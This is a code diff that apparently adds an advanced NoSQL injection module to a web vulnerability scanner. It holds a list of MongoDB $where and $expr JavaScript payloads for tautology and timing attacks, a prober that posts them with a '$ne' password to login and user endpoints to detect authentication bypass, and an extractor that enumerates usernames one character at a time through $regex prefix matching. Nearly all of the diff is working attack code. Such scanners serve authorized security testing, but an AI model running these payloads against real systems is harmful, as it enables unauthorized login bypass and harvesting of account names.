@@ -155,7 +155,45 @@ class NoSQLiScanner(BaseScanner):
             if any(x in lower for x in ("api", "auth", "login", "signin", "user", "v1", "v2", "account")):
                 self._fuzz_json_body(ep, bucket)
 
+        # ─── Adım 5: JS injection + data extraction ───────────────────────
+        self._run_js_injection_phase(endpoints)
         return self.results
+
+    def _run_js_injection_phase(self, endpoints: List[str]) -> None:
+        """
+        Coordinates Adım 5 advanced NoSQLi:
+        1. $where JavaScript injection (timing + tautology)
+        2. Username enumeration via $regex prefix matching
+        """
+        js_prober = NoSQLiJSInjectionProber()
+        extractor = MongoDBDataExtractor()
+
+        for ep in endpoints[:8]:
+            lower = ep.lower()
+            if not any(x in lower for x in ("api", "auth", "login", "signin", "user")):
+                continue
+
+            # $where JS injection
+            base_resp = None
+            try:
+                base_resp = self.session.post(ep, json={"username": "x", "password": "y"}, timeout=6)
+            except Exception:
+                pass
+
+            for f in js_prober.probe(ep, self.session, base_resp):
+                self.report_finding(**f)
+
+            # Username enumeration via $regex
+            usernames = extractor.extract_usernames(ep, self.session)
+            if usernames:
+                self.report_finding(
+                    vuln_type="NoSQL Injection — Username Enumeration ($regex)",
+                    url=ep,
+                    param="username",
+                    payload='{"username":{"$regex":"^<prefix>"}}',
+                    severity="High",
+                    evidence=f"Enumerated username prefixes: {', '.join(usernames)}",
+                )
 
     # -------------------------------------------------------------------------
     # URL parameter fuzzing
@@ -375,3 +413,141 @@ def run_nosqli_scan(ctx):
 
 
 run = run_nosqli_scan
+
+
+# ===========================================================================
+# Adım 5 — NoSQLi Advanced Standalone Classes
+# ===========================================================================
+
+_NOSQLI_JS_PAYLOADS: List[Tuple[Any, str]] = [
+    # Tautology / always-true
+    ({"$where": "1==1"},                                    "js_tautology"),
+    ({"$where": "this.password.match(/.*/)"},               "js_regex_match"),
+    ({"$where": "this.username.match(/^a/)"},               "js_prefix_match"),
+    # Time-based
+    ({"$where": "sleep(3000)||1==1"},                       "js_sleep_tautology"),
+    ({"$where": "function(){sleep(3000);return 1==1;}"},    "js_sleep_fn"),
+    ({"$where": "function(){var d=new Date();var b=d.getTime();"
+                "while(d.getTime()<b+3000){}return 1==1;}"},
+     "js_busy_wait"),
+    # $expr injection (MongoDB 3.6+)
+    ({"$expr": {"$eq": [1, 1]}},                           "expr_tautology"),
+    ({"$expr": {"$gt": ["$password", ""]}},                "expr_gt_empty"),
+    # Function constructor
+    ({"$where": "new Function('return true')()"},           "js_function_ctor"),
+]
+
+
+class NoSQLiJSInjectionProber:
+    """
+    MongoDB $where / $expr JavaScript injection prober.
+    Detects: timing-based, tautology auth bypass, JS error signatures.
+    Single Responsibility: JS injection surface detection only.
+    """
+    _PAYLOADS: List[Tuple[Any, str]] = _NOSQLI_JS_PAYLOADS
+    _JS_ERROR_RE = re.compile(
+        r"(?:MongoError|JS.*error|\$where|SyntaxError.*where|"
+        r"server.*crash|execution.*timed|RangeError)",
+        re.I,
+    )
+    _AUTH_FIELDS = ["username", "user", "email", "login", "password"]
+
+    def probe(
+        self,
+        url: str,
+        session: Any,
+        baseline_resp: Optional[Any] = None,
+        timeout: int = 8,
+    ) -> List[Dict[str, Any]]:
+        import time as _time
+        findings: List[Dict[str, Any]] = []
+        base_status = baseline_resp.status_code if baseline_resp else 200
+        base_len = len(baseline_resp.content) if baseline_resp else 0
+
+        for field in self._AUTH_FIELDS:
+            for payload, tech in self._PAYLOADS:
+                body = {field: payload, "password": {"$ne": ""}}
+                try:
+                    t0 = _time.time()
+                    resp = session.post(url, json=body, timeout=timeout + 3)
+                    elapsed = _time.time() - t0
+                    text = resp.text or ""
+
+                    is_bypass = base_status in (401, 403) and resp.status_code == 200
+                    is_timing = elapsed > 2.5 and "sleep" in tech
+                    is_error  = bool(self._JS_ERROR_RE.search(text))
+                    is_size   = resp.status_code == 200 and abs(len(resp.content) - base_len) > 50
+
+                    if is_bypass or is_timing or is_error or is_size:
+                        findings.append({
+                            "vuln_type": "NoSQL JavaScript Injection ($where / $expr)",
+                            "url": url,
+                            "param": field,
+                            "payload": json.dumps(payload),
+                            "severity": "Critical" if is_bypass else "High",
+                            "evidence": (
+                                f"Auth bypass {base_status}→{resp.status_code}" if is_bypass
+                                else f"JS timing: {elapsed:.2f}s" if is_timing
+                                else f"JS error in response" if is_error
+                                else f"Response size changed: {base_len}→{len(resp.content)}"
+                            ),
+                        })
+                        break  # one hit per field
+                except Exception:
+                    continue
+        return findings
+
+
+class MongoDBDataExtractor:
+    """
+    MongoDB data extraction via NoSQLi.
+    Techniques: $regex prefix matching for enumeration.
+    Single Responsibility: data extraction from confirmed NoSQLi only.
+    """
+
+    _CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@.-"
+    _MAX_DEPTH = 5
+
+    def extract_usernames(
+        self,
+        url: str,
+        session: Any,
+        timeout: int = 6,
+    ) -> List[str]:
+        """
+        Enumerate usernames character-by-character via $regex prefix matching.
+        Returns list of discovered username prefixes (e.g. ['admin*', 'user*']).
+        """
+        found: List[str] = []
+        # Try multiple starting characters to find distinct users
+        for start_ch in "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ01":
+            prefix = self._grow_prefix(start_ch, url, session, timeout)
+            if prefix and prefix not in found:
+                found.append(prefix + "*")
+            if len(found) >= 5:
+                break
+        return found
+
+    def _grow_prefix(
+        self, start: str, url: str, session: Any, timeout: int
+    ) -> Optional[str]:
+        prefix = start
+        for _ in range(self._MAX_DEPTH - 1):
+            next_ch = self._find_next_char(prefix, url, session, timeout)
+            if not next_ch:
+                break
+            prefix += next_ch
+        return prefix if len(prefix) > 1 else None
+
+    def _find_next_char(
+        self, prefix: str, url: str, session: Any, timeout: int
+    ) -> Optional[str]:
+        for ch in self._CHARSET:
+            payload = {"username": {"$regex": f"^{re.escape(prefix + ch)}"}, "password": {"$ne": ""}}
+            try:
+                resp = session.post(url, json=payload, timeout=timeout)
+                if resp.status_code == 200 and len(resp.content) > 10:
+                    return ch
+            except Exception:
+                continue
+        return None
